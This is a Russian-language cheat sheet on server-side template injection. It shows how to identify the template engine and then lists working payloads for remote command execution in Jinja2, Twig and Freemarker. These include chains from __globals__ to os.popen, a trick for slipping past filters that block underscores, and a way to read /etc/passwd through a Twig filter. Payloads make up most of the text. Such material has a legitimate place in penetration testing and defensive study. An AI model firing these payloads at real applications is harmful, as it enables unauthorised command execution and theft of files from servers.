# SSTI

Определяем движок шаблонов, потом строим пейлоад. Половина работы — воткнуть `{{7*7}}` везде, где ввод отражается обратно.

## Определение движка

```
{{7*7}}      -> Jinja2, Twig, Nunjucks
${7*7}       -> Freemarker, Thymeleaf, ещё раз Jinja2 (смотрим контекст)
<%= 7*7 %>   -> ERB / Ruby
```

Jinja2 vs Twig: `{{7*'7'}}` — Jinja отдаст `7777777`, Twig сломается или вернёт `49`.

## Jinja2: к RCE

```jinja
{{config}}
{{self.__init__.__globals__.__builtins__}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Или через request:

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Если режут подчёркивания — пролезает конкатенация литералов:

```jinja
{{request['__cla''ss__'].__mro__[1].__subclasses__()}}
```

Jinja склеивает соседние строки, фильтр по слову `__class__` пропускает.

## Twig

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Работает на старых версиях. На свежих Twig почти всё закрыто, остаётся чтение через фильтры, если они доступны:

```twig
{{'/etc/passwd'|file_excerpt(1,30)}}
```

## Freemarker

```
${"freemarker.template.utility.Execute"?new()("id")}
```

С 2.3.19 `?new()` ограничен, на легаси ещё живёт.

## Что проверять до того, как строить RCE

- Отражается ли ввод именно в шаблоне. Простое отражение в HTML — это XSS, а не SSTI.
- Есть ли sandbox (SandboxedEnvironment у Jinja закрывает большинство цепочек через `__globals__`).
- Что уже лежит в контексте: `{{cycler}}`, `{{request}}`, `{{url_for}}` — от этого зависит, с чего начинать цепочку.
